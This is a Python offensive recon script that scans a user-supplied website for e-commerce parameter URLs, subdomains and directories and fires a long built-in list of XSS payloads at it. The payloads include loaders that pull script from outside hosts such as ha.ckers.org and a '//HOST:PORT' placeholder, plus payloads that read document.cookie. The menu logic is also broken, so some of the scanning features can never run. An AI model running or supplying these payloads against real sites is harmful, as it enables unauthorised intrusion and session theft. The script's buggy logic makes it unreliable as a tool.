import requests
from bs4 import BeautifulSoup

RED = "\033[31m"
GREEN = "\033[32m"
RESET = "\033[0m"
Blue = "\033[1;36;40m"

def parameter(domain, parameter):
    url = f"https://{domain}/{parameter}"
    try:
        response = requests.head(url, timeout=5)
        if response.status_code == 200:
            print(f"{GREEN}[+] We Found This Parameter {parameter} In This Domain {url} - Accessible {RESET}")
        elif response.status_code == 301:
            print(f"{Blue}[!] Nah, We Found Parameter {parameter} But It Has A Redirect {url}{RESET}")
        elif response.status_code == 404:
            print(f"{RED}[-] Nothing Here {url}{RESET}")
        else:
            print(f"{RED}[-] Unexpected Status Code for Parameter {parameter} in Domain {domain}{RESET}")
    except requests.exceptions.RequestException as e:
        print(f"{RED}[-] Error occurred while checking {url}: {str(e)}{RESET}")

def xss_finder(target, payloads):
    try:
        response = requests.get(target, verify=False, timeout=5)
        response.raise_for_status()
        for payload in payloads:
            url = f"{target}{payload}"
            try:
                response = requests.get(url, verify=False, timeout=5)
                response.raise_for_status()
                if payload in response.text:
                    print(f"\n{GREEN}[+] Found XSS Vulnerability! In {url}{RESET}")
                    print(f"Payload: {payload}")
                else:
                    print(f"{RED}[-] {payload} not found in {url}{RESET}")
            except requests.exceptions.RequestException as e:
                print(f"{RED}[-] Error with payload {payload}: {e}{RESET}")
    except requests.exceptions.RequestException as e:
        print(f"{RED}[-] Error accessing target: {e}{RESET}")

def check_subdomain(subdomain, domain):
    url = f'https://{subdomain}.{domain}/'
    try:
        response = requests.get(url, timeout=5)
        if response.status_code == 200:
            print(f"{GREEN}[+] We Found This Subdomain {url} My Friend...{RESET}")
        elif response.status_code == 301:
            print(f"{RED}[!] We Found This SubDomain {url} But It's Not For You, I Think It's For Admin Or Some Roles....{RESET}")
        else:
            print(f"{RED}[-] Nothing Here {url}")
    except requests.exceptions.RequestException as e:
        return None

def dir_searcher(website, my_list):
    for i in my_list:
        res = requests.get(f"{website}/{i}")
        print(f"{RED}[+] {res.status_code} {RESET} : {RED} {res.url} {RESET}")
        if res.status_code == 200:
            print(f"{GREEN}[+] {res.url} {RESET} : {GREEN} [+] {res.status_code} {RESET}")

def main():
    target = input(f"{GREEN}[x] Put Your Target Website Please (e.g., www.google.com/anything): {RESET}")
    choice = input(f"""
    {GREEN}
    1- Bruteforce
    2- Your Wordlist
    :  {RESET}""")

    if choice == "1":
        word_list = ["about.php?cartID=", "accinfo.php?cartId=", "acclogin.php?cartID=", "add.php?bookid=", "add_cart.php?num=", "addcart.php?", "addItem.php", "add-to-cart.php?ID=", "addToCart.php?idProduct=", "addtomylist.php?ProdId=", "adminEditProductFields.php?intProdID=", "advSearch_h.php?idCategory=", "affiliate.php?ID=", "affiliate-agreement.cfm?storeid=", "affiliates.php?id=", "ancillary.php?ID=", "archive.php?id=", "article.php?id=", "phpx?PageID", "basket.php?id=", "Book.php?bookID=", "book_list.php?bookid=", "book_view.php?bookid=", "BookDetails.php?ID=", "browse.php?catid=", "browse_item_details.php", "Browse_Item_Details.php?Store_Id=", "buy.php?", "buy.php?bookid=", "bycategory.php?id=", "cardinfo.php?card=", "cart.php?action=", "cart.php?cart_id=", "cart.php?id=", "cart_additem.php?id=", "cart_validate.php?id=", "cartadd.php?id=", "cat.php?iCat=", "catalog.php", "catalog.php?CatalogID=", "catalog_item.php?ID=", "catalog_main.php?catid=", "category.php", "category.php?catid=", "category_list.php?id=", "categorydisplay.php?catid=", "checkout.php?cartid=", "checkout.php?UserID=", "checkout_confirmed.php?order_id=", "checkout1.php?cartid=", "comersus_listCategoriesAndProducts.php?idCategory=", "comersus_optEmailToFriendForm.php?idProduct=", "comersus_optReviewReadExec.php?idProduct=", "comersus_viewItem.php?idProduct=", "comments_form.php?ID=", "contact.php?cartId=", "content.php?id=", "customerService.php?ID1=", "default.php?catID=", "description.php?bookid=", "details.php?BookID=", "details.php?Press_Release_ID=", "details.php?Product_ID=", "details.php?Service_ID=", "display_item.php?id=", "displayproducts.php", "downloadTrial.php?intProdID=", "emailproduct.php?itemid=", "emailToFriend.php?idProduct=", "events.php?ID=", "faq.php?cartID=", "faq_list.php?id=", "faqs.php?id=", "feedback.php?title=", "freedownload.php?bookid=", "fullDisplay.php?item=", "getbook.php?bookid=", "GetItems.php?itemid=", "giftDetail.php?id=", "help.php?CartId=", "home.php?id=", "index.php?cart=", "index.php?cartID=", "index.php?ID=", "info.php?ID=", "item.php?eid=", "item.php?item_id=", "item.php?itemid=", "item.php?model=", "item.php?prodtype=", "item.php?shopcd=", "item_details.php?catid=", "item_list.php?maingroup", "item_show.php?code_no=", "itemDesc.php?CartId=", "itemdetail.php?item=", "itemdetails.php?catalogid=", "learnmore.php?cartID=", "links.php?catid=", "list.php?bookid=", "List.php?CatID=", "listcategoriesandproducts.php?idCategory=", "modline.php?id=", "myaccount.php?catid=", "news.php?id=", "order.php?BookID=", "order.php?id=", "order.php?item_ID=", "OrderForm.php?Cart=", "page.php?PartID=", "payment.php?CartID=", "pdetail.php?item_id=", "powersearch.php?CartId=", "price.php", "privacy.php?cartID=", "prodbycat.php?intCatalogID=", "prodetails.php?prodid=", "prodlist.php?catid=", "product.php?bookID=", "product.php?intProdID=", "product_info.php?item_id=", "productDetails.php?idProduct=", "productDisplay.php", "productinfo.php?item=", "productlist.php?ViewType=Category&CategoryID=", "productpage.php", "products.php?ID=", "products.php?keyword=", "products_category.php?CategoryID=", "products_detail.php?CategoryID=", "productsByCategory.php?intCatalogID=", "prodView.php?idProduct=", "promo.php?id=", "promotion.php?catid=", "pview.php?Item=", "resellers.php?idCategory=", "results.php?cat=", "savecart.php?CartId=", "search.php?CartID=", "searchcat.php?search_id=", "Select_Item.php?id=", "Services.php?ID=", "shippinginfo.php?CartId=", "shop.php?a=", "shop.php?action=", "shop.php?bookid=", "shop.php?cartID=", "shop_details.php?prodid=", "shopaddtocart.php", "shopaddtocart.php?catalogid=", "shopbasket.php?bookid=", "shopbycategory.php?catid=", "shopcart.php?title=", "shopcreatorder.php", "shopcurrency.php?cid=", "shopdc.php?bookid=", "shopdisplaycategories.php", "shopdisplayproduct.php?catalogid=", "shopdisplayproducts.php", "shopexd.php", "shopexd.php?catalogid=", "shopping_basket.php?cartID=", "shopprojectlogin.php", "shopquery.php?catalogid=", "shopremoveitem.php?cartid=", "shopreviewadd.php?id=", "shopreviewlist.php?id=", "ShopSearch.php?CategoryID=", "shoptellafriend.php?id=", "shopthanks.php", "shopwelcome.php?w=", "ShowItem.php?id=", "showproduct.php?cat=", "site.php?id=", "staff.php?cartId=", "store.php?catID=", "store.php?catid=", "store_bycat.php?catid=", "store_details.php?catid=", "store_listing.php?catid=", "store_results.php?cat_id=", "storecat.php?cat_id=", "storefront.php?id=", "storefront.php?storeid=", "storeitem.php?item=", "storesearch.php?storeID=", "StoreSummary.php?Title=", "support.php?=", "team.php?cartId=", "tellafriend.php?id=", "thankyou.php?cartid=", "top10.php?cat=", "updatebasket.php?book=", "updates.php?ID=", "view.php?Item=", "view_cart.php?userID=", "View_Shop.php?ID=", "view_product.php?product=", "viewitem.php?recor=", "Viewitem.php?recor=", "viewitems.php?Category=", "vq2-catalog_category_view.php?cPath=", "waf.php?id=", "webpage.php?id=", "website.php?id=", "whatsnew.php?id=", "productList.php?category=", "window.php?BookID=", "yourdomain.com/catalog.php?", "zoom.php?cartID=", "addevent.php?intEventID=", "affiche.php?no=", "index1.php?link=", "event.php?EventID=", "product_ranges_view.php?ID=", "productDisplay.php?ProductID=", "index1.php?link=", "hosting_info.php?ID=", "zhanka?bookid=", "proddetail.php?prod=", "big.php?item=", "newsid=", "faq2.php?id=", "productinfo.php?id=", "productinfo.php?item=", "inc_product_detail.php?id=", "viewprod.php?idProduct=", "db.php?id=", "Show_Items.php?id=", "page.php?PartID=", "theme.php?cat=", "clubpage.php?cid=", "viewevent.php?EventID=", "articles.php?id=", "collectibles.php?ID=", "page.php?PartID=", "products_id=", "collectionitem.php?id=", "document.php?id=", "product.php?pro_id=", "collection.php?id=", "productitem.php?cat=", "productpage.php?id=", "team.php?cartId=", "products_id=", "productlist.php?id=", "ecom.php?prodID=", "products.php?page=", "productdetail.php?item=", "product_list.php?Item=", "viewcategory.php?id=", "view_products.php?category=", "productlist.php?CAT=", "pr.php?catid=", "productlist.php?catid=", "productlist.php?AdId=", "productdetail.php?CAT=", "productdetail.php?PID=", "commerce.php?dept=", "products.php?cat=", "product.php?ItemID=", "index.php?cat=", "ViewProduct.php?ref=", "Event.php?ID=", "productdetail.php?sku=", "view_product.php?code=", "news-detail.php?id=", "preview.php?id=", "eventDetails.php?id=", "productinfo.php?item_id=", "product_details.php?item_id=", "ProductDetails.php?ID=", "page.php?PartID=", "itemDetail.php?item=", "default.php?cPath=", "products.php?page=", "product.php?ID=", "productinfo.php?id=", "product-detail.php?id=", "product-list.php?item=", "productlisting.php?item=", "productinfo.php?catalog=", "productinfo.php?cat=", "product_info.php?item=", "product.php?product=", "ProductDetails.php?ID=", "item.php?ID=", "productinfo.php?prodID=", "productdetails.php?ref=", "ProductDetails.php?cat=", "products.php?id=", "bookDetails.php?ID=", "productDetail.php?ItemID=", "item.php?ID=", "products.php?id=", "products.php?ID=", "show_item.php?item=", "view_product.php?num=", "productinfo.php?pid=", "productinfo.php?cat=", "product.php?item=", "show_product.php?item=", "products.php?id=", "index.php?Itemid=", "shop.php?c=", "product_list.php?CategoryID=", "products.php?Cat=", "product_details.php?prodid=", "products.php?ID=", "product_info.php?cPath=", "item.php?catid=", "product.php?cPath=", "products.php?cPath=", "storepage.php?ID=", "show_product.php?id=", "products.php?ref=", "product.php?item=", "product.php?sku=", "productinfo.php?CartId=", "productinfo.php?item=", "product.php?product_id=", "storepage.php?pid=", "productdetails.php?cat=", "product.php?cPath=", "viewitem.php?PID=", "products.php?cPath=", "productDetails.php?item=", "itemDetail.php?item=", "default.php?CategoryID=", "product_list.php?category=", "ProductDetails.php?ID=", "index.php?cart=", "product_detail.php?id=", "product.php?cat=", "page.php?PartID=", ]

        for word in word_list:
            parameter(target, word)
    
    elif choice == "2":
        payloads =[ 
                "-prompt(8)-",
                '-prompt(8)-',
                ";a=prompt,a()//",
                ';a=prompt,a()//',
                '-eval("window[\'pro\'%2B\'mpt\'](8)")-',
                "-eval(\"window['pro'%2B'mpt'](8)\")-",
                "onclick=prompt(8)>\"@x.y",
                "onclick=prompt(8)><svg/onload=prompt(8)\">@x.y",
                "<image/src/onerror=prompt(8)>",
                "<img/src/onerror=prompt(8)>",
                "<image src=onerror=prompt(8)>",
                "<img src=onerror=prompt(8)>",
                "<image src =q onerror=prompt(8)>",
                "<img src =q onerror=prompt(8)>",
                "</scrip</script>t><img src =q onerror=prompt(8)>",
                "<svg onload=alert(1)>",
                "\"><svg onload=alert(1)//",
                "onmouseover=alert(1)//",
                "autofocus/onfocus=alert(1)//",
                '-alert(1)-',
                '-alert(1)//',
                '\'-alert(1)//',
                '</script><svg onload=alert(1)>',
                '<x contenteditable onblur=alert(1)>lose focus!',
                '<x onclick=alert(1)>click this!',
                '<x oncopy=alert(1)>copy this!',
                '<x oncontextmenu=alert(1)>right click this!',
                '<x oncut=alert(1)>copy this!',
                '<x ondblclick=alert(1)>double click this!',
                '<x ondrag=alert(1)>drag this!',
                '<x contenteditable onfocus=alert(1)>focus this!',
                '<x contenteditable oninput=alert(1)>input here!',
                '<x contenteditable onkeydown=alert(1)>press any key!',
                '<x contenteditable onkeypress=alert(1)>press any key!',
                '<x contenteditable onkeyup=alert(1)>press any key!',
                '<x onmousedown=alert(1)>click this!',
                '<x onmousemove=alert(1)>hover this!',
                '<x onmouseout=alert(1)>hover this!',
                '<x onmouseover=alert(1)>hover this!',
                '<x onmouseup=alert(1)>click this!',
                '<x contenteditable onpaste=alert(1)>paste here!',
                '<script>alert(1)//',
                '<script>alert(1)<!--',
                '<script src=//brutelogic.com.br/1.js>',
                '<script src=//3334957647/1>',
                '%3Cx onxxx=alert(1)',
                '<%78 onxxx=1',
                '<x %6Fnxxx=1',
                '<x o%6Exxx=1',
                '<x on%78xx=1',
                '<x onxxx%3D1',
                '<X onxxx=1',
                '<x OnXxx=1',
                '<X OnXxx=1',
                '<x onxxx=1 onxxx=1',
                '<x/onxxx=1',
                '<x%09onxxx=1',
                '<x%0Aonxxx=1',
                '<x%0Conxxx=1',
                '<x%0Donxxx=1',
                '<x%2Fonxxx=1',
                '<x 1=\'1\'onxxx=1',
                '<x 1="1"onxxx=1',
                '<x </onxxx=1',
                '<x 1=">" onxxx=1',
                '<http://onxxx%3D1/',
                '<x onxxx=alert(1) 1=\'',
                '<svg onload=setInterval(function(){with(document)body.appendChild(createElement(\'script\')).src=\'//HOST:PORT\'},0)>',
                '\'onload=alert(1)><svg/1=\'',
                '">alert(1)</script><script/1=\'',
                '*/alert(1)</script><script/>/*',
                '*/alert(1)\'onload="/*<svg/1=\'',
                '`-alert(1)\'onload="`<svg/1=\'',
                "';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))--></SCRIPT>'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",
                "'';!--\"<XSS>=&{}()",
                '0"autofocus/onfocus=alert(1)--><video/poster/onerror=prompt(2)"-confirm(3)-',
                'script/src=data:,alert()',
                'marquee/onstart=alert()',
                'video/poster/onerror=alert()',
                'isindex/autofocus/onfocus=alert()',
                'SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>',
                'IMG SRC="javascript:alert(\'XSS\');"',
                'IMG SRC=javascript:alert(\'XSS\')',
                'IMG SRC=JaVaScRiPt:alert(\'XSS\')',
                'IMG SRC=javascript:alert("XSS")',
                'IMG SRC=`javascript:alert("RSnake says, \'XSS\'")`',
                'a onmouseover="alert(document.cookie)">xxs link</a',
                'a onmouseover=alert(document.cookie)>xxs link</a',
                'IMG """><SCRIPT>alert("XSS")</SCRIPT>"',
                'IMG SRC=javascript:alert(String.fromCharCode(88,83,83))',
                'IMG SRC=# onmouseover="alert(\'xxs\')',
                'IMG SRC= onmouseover="alert(\'xxs\')',
                'IMG onmouseover="alert(\'xxs\')',
                'IMG SRC=/ onerror="alert(String.fromCharCode(88,83,83))"></img',
                'IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;',
                'IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041',
                'IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29',
                'IMG SRC="jav	ascript:alert(\'XSS\');"',
                'IMG SRC="jav&#x09;ascript:alert(\'XSS\');"',
                'IMG SRC="jav&#x0A;ascript:alert(\'XSS\');"',
                'IMG SRC="jav&#x0D;ascript:alert(\'XSS\');"',
                'IMG SRC=" &#14;  javascript:alert(\'XSS\');"',
                'SCRIPT/XSS SRC="http://ha.ckers.org/xss.js"></SCRIPT>',
                'BODY onload!#$%&()*~+-_.,:;?@[/|\\]^`=alert("XSS")',
                'SCRIPT/SRC="http://ha.ckers.org/xss.js"></SCRIPT>',
                '<<SCRIPT>alert("XSS");//<</SCRIPT>',
                'SCRIPT SRC=http://ha.ckers.org/xss.js?< B >',
                'SCRIPT SRC=//ha.ckers.org/.j',
                'IMG SRC="javascript:alert(\'XSS\')"',
                'iframe src=http://ha.ckers.org/scriptlet.html <',
                '";alert(\'XSS\');//',
                'script><script>alert(\'XSS\');</script>',
                '/TITLE><SCRIPT>alert("XSS");</SCRIPT>',
                'INPUT TYPE="IMAGE" SRC="javascript:alert(\'XSS\');"',
                'BODY BACKGROUND="javascript:alert(\'XSS\')"',
                'IMG DYNSRC="javascript:alert(\'XSS\')"',
                'IMG LOWSRC="javascript:alert(\'XSS\')"',
                'STYLE>li {list-style-image: url("javascript:alert(\'XSS\')");</STYLE><UL><LI>XSS</br>',
                'IMG SRC=\'vbscript:msgbox("XSS")\'',
                'IMG SRC="livescript:[code]"',
                'BODY ONLOAD=alert(\'XSS\')',
                'BGSOUND SRC="javascript:alert(\'XSS\');"',
                'BR SIZE="&{alert(\'XSS\')}">',
                'LINK REL="stylesheet" HREF="javascript:alert(\'XSS\');"',
                'LINK REL="stylesheet" HREF="http://ha.ckers.org/xss.css"',
                'STYLE>@import\'http://ha.ckers.org/xss.css\';</STYLE>',
                'META HTTP-EQUIV="Link" Content="<http://ha.ckers.org/xss.css>; REL=stylesheet"',
                'STYLE>BODY{-moz-binding:url("http://ha.ckers.org/xssmoz.xml#xss")}</STYLE>',
                'STYLE>@im\\port\'\\ja\\vasc\\ript:alert("XSS");\'</STYLE>',
                'IMG STYLE="xss:expr/*XSS*/ession(alert(\'XSS\'))"',
                'exp/*<A STYLE=\'no\\xss:noxss("*//*");xss:ex/*XSS*//*/*/pression(alert("XSS"))>',
                'STYLE TYPE="text/javascript">alert(\'XSS\');</STYLE>',
                'STYLE>.XSS{background-image:url("javascript:alert(\'XSS\')");</STYLE><A CLASS=XSS></A>',
                'STYLE type="text/css">BODY{background:url("javascript:alert(\'XSS\')")</STYLE>',
                'XSS STYLE="xss:expression(alert(\'XSS\'))"',
                'XSS STYLE="behavior: url(xss.htc);"',
                '¼script¾alert(¢XSS¢)¼/script¾',
                'META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert(\'XSS\');"',
                'META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K"',
                'META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:alert(\'XSS\');"',
                'IFRAME SRC="javascript:alert(\'XSS\');"',
                'IFRAME SRC=# onmouseover="alert(document.cookie)"',
                'FRAMESET><FRAME SRC="javascript:alert(\'XSS\');">',
                'TABLE BACKGROUND="javascript:alert(\'XSS\')"',
                'TABLE><TD BACKGROUND="javascript:alert(\'XSS\')"',
                'DIV STYLE="background-image: url(javascript:alert(\'XSS\'))"',
                'DIV STYLE="background-image:\\0075\\0072\\006C\\0028\'\\006a\\0061\\0076\\0061\\0073\\0063\\0072\\0069\\0070\\0074\\003a\\0061\\006c\\0065\\0072\\0074\\0028.1027\\0058.1053\\0053\\0027\\0029\'\\0029"',
                'DIV STYLE="background-image: url(&#1;javascript:alert(\'XSS\'))"',
                'DIV STYLE="width: expression(alert(\'XSS\'));"',
                '<!--[if gte IE 4]><SCRIPT>alert(\'XSS\');</SCRIPT><![endif]-->',
                'BASE HREF="javascript:alert(\'XSS\');//"',
                'OBJECT TYPE="text/x-scriptlet" DATA="http://ha.ckers.org/scriptlet.html"></OBJECT>',
                '<!--#exec cmd="/bin/echo \'<SCR\'--><!--#exec cmd="/bin/echo \'IPT SRC=http://ha.ckers.org/xss.js></SCRIPT>\'"-->',
                '<? echo(\'<SCR)\';echo(\'IPT>alert("XSS")</SCRIPT>\'); ?>',
                'IMG SRC="http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode"',
                'META HTTP-EQUIV="Set-Cookie" Content="USERID=<SCRIPT>alert(\'XSS\')</SCRIPT>"',
                '<HEAD><META HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; charset=UTF-7"> </HEAD>+ADw-SCRIPT+AD4-alert(\'XSS\');+ADw-/SCRIPT+AD4-',
                'SCRIPT a=">" SRC="http://ha.ckers.org/xss.js"></SCRIPT>',
                'SCRIPT =">" SRC="http://ha.ckers.org/xss.js"></SCRIPT>',
                'SCRIPT a=">" \'\' SRC="http://ha.ckers.org/xss.js"></SCRIPT>',
                'SCRIPT "a=\'>\'" SRC="http://ha.ckers.org/xss.js"></SCRIPT>',
                'SCRIPT a=`>` SRC="http://ha.ckers.org/xss.js"></SCRIPT>',
                'SCRIPT a=">\'>" SRC="http://ha.ckers.org/xss.js"></SCRIPT>',
                'SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="http://ha.ckers.org/xss.js"></SCRIPT>',
                'A HREF="http://66.102.7.147/">XSS</A',
                '0"autofocus/onfocus=alert(1)--><video/poster/ error=prompt(2)"-confirm(3)-',
                'veris-->group<svg/onload=alert(/XSS/)//',
                '#"><img src=M onerror=alert(\'XSS\');>',
                'element[attribute=\'<img src=x onerror=alert(\'XSS\');>',
                '[<blockquote cite="]">[" onmouseover="alert(\'RVRSH3LL_XSS\');" ]',
                '%22;alert%28%27RVRSH3LL_XSS%29//',
                'javascript:alert%281%29;',
                '<w contenteditable id=x onfocus=alert()>',
                'alert;pg("XSS")',
                '<svg/onload=%26%23097lert%26lpar;1337)>',
                '<script>for((i)in(self))eval(i)(1)</script>',
                '<scr<script>ipt>alert(1)</scr</script>ipt><scr<script>ipt>alert(1)</scr</script>ipt>',
                '<sCR<script>iPt>alert(1)</SCr</script>IPt>',
                '<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4=">test</a',
                ]
        xss_finder(target, payloads)

    elif choice == "3":
        domain = input(f"{Blue}[+] Please Enter Your Target Domain... - > : {RESET}")
        subdomains = domain.split('.')
        main_domain = subdomains[-2] + "." + subdomains[-1]

        found_subdomains = []

        choice = input(f"""
        {GREEN}
        1- Bruteforce
        2- Your Wordlist
        : {RESET}""")
        wordlist = [
            "www", "mail", "ftp", "localhost", "webmail", "smtp", "pop", "ns1", "webdisk", "ns2",
            "cpanel", "whm", "autodiscover", "autoconfig", "m", "imap", "test", "ns", "blog", "pop3", 
            "dev", "www2", "admin", "forum", "news", "vpn", "ns3", "mail2", "new", "mysql", "old", 
            "lists", "support", "mobile", "mx", "static", "docs", "beta", "shop", "sql", "secure", 
            "demo", "cp", "calendar", "wiki", "web", "media", "email", "images", "img", "www1", 
            "intranet", "portal", "video", "sip", "dns2", "api", "cdn", "stats", "dns1", "ns4", 
            "www3", "dns", "search", "staging", "server", "mx1", "chat", "wap", "my", "svn", "mail1", 
            "sites", "proxy", "ads", "host", "crm", "cms", "backup", "mx2", "lyncdiscover", "info", 
            "apps", "download", "remote", "db", "forums", "store", "relay", "files", "newsletter", 
            "app", "live", "owa", "en", "start", "sms", "office", "exchange", "ipv4", "mail3", 
            "help", "blogs", "helpdesk", "web1", "home", "library", "ftp2", "ntp", "monitor", 
            "login", "service", "correo", "www4", "moodle", "it", "gateway", "gw", "i", "stat", 
            "stage", "ldap", "tv", "ssl", "web2", "ns5", "upload", "nagios", "smtp2", "online", 
            "ad", "survey", "data", "radio", "extranet", "test2", "mssql", "dns3", "jobs", "services", 
            "panel", "irc", "hosting", "cloud", "de", "gmail", "s", "bbs", "cs", "ww", "mrtg", 
            "git", "image", "members", "poczta", "s1", "meet", "preview", "fr", "cloudflare-resolve-to", 
            "dev2", "photo", "jabber", "legacy", "go", "es", "ssh", "redmine", "partner", "vps", 
            "server1", "sv", "ns6", "webmail2", "av", "community", "cacti", "time", "sftp", "lib", 
            "facebook", "www5", "smtp1", "feeds", "w", "games", "ts", "alumni", "dl", "s2", "phpmyadmin", 
            "archive", "cn", "tools", "stream", "projects", "elearning", "im", "iphone", "control", 
            "voip", "test1", "ws", "rss", "sp", "wwww", "vpn2", "jira", "list", "connect", "gallery", 
            "billing", "mailer", "update", "pda", "game", "ns0", "testing", "sandbox", "job", "events", 
            "dialin", "ml", "fb", "videos", "music", "a", "partners", "mailhost", "downloads", "reports", 
            "ca", "router", "speedtest", "local", "training", "edu", "bugs", "manage", "s3", "status", 
            "host2", "ww2", "marketing", "conference", "content", "network-ip", "broadcast-ip", "english", 
            "catalog", "msoid", "mailadmin", "pay", "access", "streaming", "project", "t", "sso", "alpha", 
            "photos", "staff", "e", "auth", "v2", "web5", "web3", "mail4", "devel", "post", "us", 
            "images2", "master", "rt", "ftp1", "qa", "wp", "dns4", "www6", "ru", "student", "w3", 
            "citrix", "trac", "doc", "img2", "css", "mx3", "adm", "web4", "hr", "mailserver", "travel", 
            "sharepoint", "sport", "member", "bb", "agenda", "link", "server2", "vod", "uk", "fw", 
            "promo", "vip", "noc", "design", "temp", "gate", "ns7", "file", "ms", "map", "cache", 
            "painel", "js", "event", "mailing", "db1", "c", "auto", "img1", "vpn1", "business", "mirror", 
            "share", "cdn2", "site", "maps", "tickets", "tracker", "domains", "club", "images1", "zimbra", 
            "cvs", "b2b", "oa", "intra", "zabbix", "ns8", "assets", "main", "spam", "lms", "social", 
            "faq", "feedback", "loopback", "groups", "m2", "cas", "loghost", "xml", "nl", "research", 
            "art", "munin", "dev1", "gis", "sales", "images3", "report", "google", "idp", "cisco", 
            "careers", "seo", "dc", "lab", "d", "firewall", "fs", "eng", "ann", "mail01", "mantis", 
            "v", "affiliates", "webconf", "track", "ticket", "pm", "db2", "b", "clients", "tech", "erp", 
            "monitoring", "cdn1", "images4", "payment", "origin", "client", "foto", "domain", "pt", "pma", 
            "directory", "cc", "public", "finance", "ns11", "test3", "wordpress", "corp", "sslvpn", "cal", 
            "mailman", "book", "ip", "zeus", "ns10", "hermes", "storage", "free", "static1", "pbx", "banner", 
            "mobil", "kb", "mail5", "direct", "ipfixe", "wifi", "development", "board", "ns01", "st", "reviews", 
            "radius", "pro", "atlas", "links", "in", "oldmail", "register", "s4", "images6", "static2", "id", 
            "shopping", "drupal", "analytics", "m1", "images5", "images7", "img3", "mx01", "www7", "redirect", 
            "sitebuilder", "smtp3", "adserver", "net", "user", "forms", "outlook", "press", "vc", "health", 
            "work", "mb", "mm", "f", "pgsql", "jp", "sports", "preprod", "g", "p", "mdm", "ar", 
            "lync", "market", "dbadmin", "barracuda", "affiliate", "mars", "users", "images8", "biblioteca", "mc", "ns12", 
            "math", "ntp1", "web01", "software", "pr", "jupiter", "labs", "linux", "sc", "love", "fax", 
            "php", "lp", "tracking", "thumbs", "up", "tw"
        ]
        if choice == '1':
            for subdomain in wordlist:
                result = check_subdomain(subdomain, domain)
                if result:
                    found_subdomains.append(result)
        elif choice == '2':
            custom_wordlist = input(f"{GREEN}[+] Please enter your custom wordlist (comma-separated): {RESET}")
            custom_wordlist = custom_wordlist.split(',')
            for subdomain in custom_wordlist:
                result = check_subdomain(subdomain.strip(), domain)
                if result:
                    found_subdomains.append(result)
        else:
            print("Invalid choice. Please enter 1 for Bruteforce or 2 for a custom wordlist.")

        if found_subdomains:
            print(f"{GREEN}[+] Found Subdomains:{RESET}")
            for subdomain in found_subdomains:
                print(subdomain)
        else:
            print(f"{RED}No subdomains were found.{RESET}")

    elif choice == "4":
        my_list = [
            "Downloads", "site-map",  # Add your directory paths here
            ]
        website = input("Enter the target website (e.g., http://example.com): ")
        dir_searcher(website, my_list)

if __name__ == "__main__":
    main()
